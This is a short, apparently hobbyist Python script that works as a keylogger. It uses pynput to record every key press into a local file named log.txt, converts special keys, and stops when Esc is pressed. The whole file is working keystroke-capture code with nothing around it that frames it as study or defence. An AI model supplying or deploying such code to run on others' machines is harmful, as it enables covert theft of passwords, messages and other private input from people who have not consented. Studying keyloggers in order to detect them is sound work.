from pynput.keyboard import Listener as lr
import datetime

date = datetime.datetime.now()

def write_to_file(key):
    f = open("log.txt", 'a')
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    if letter == "Key.shift":
        letter = ""
    if letter == "Key.backspace":
        letter = "Borrar"
    if letter == "Key.esc":
        f.close()
        exit()

    f.write(letter)

# Collecting events until stopped

with lr(on_press=write_to_file) as l:
    l.join()


# 'with' will automatically close the listener. When we stop the program the memory allocated
# to this listener won't be released. 'with' makes sure whatever happens, when an error is there
# or the program stops the memory is released. It's just a good coding principle to follow